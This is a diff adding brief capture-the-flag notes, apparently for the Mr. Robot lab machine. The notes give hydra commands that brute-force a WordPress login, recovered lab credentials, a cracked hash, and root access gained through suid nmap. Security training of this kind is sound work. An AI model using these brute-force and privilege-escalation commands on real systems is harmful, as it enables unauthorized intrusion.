@@ -1,0 +1,18 @@
+Found wordpress login on /login
+Found admin login http://10.10.57.191/wp-admin
+
+Foudn first key in robots.txt
+
+Found username with hydra
+hydra -f  -L fsocity.dic -p test 10.10.57.191 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.57.191%2Fwp-admin%2F&testcookie=1:F=Invalid username"
+
+Found password with hydra
+hydra -l Elliot -P fsocity.dic 10.10.57.191 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.57.191%2Fwp-admin%2F&testcookie=1:S=302"
+
+Elliot:ER28-0652
+
+Could bruteforce hash in /home/robot
+
+robot:abcdefghijklmnopqrstuvwxyz
+
+Got root through interactive mode with suid nmap
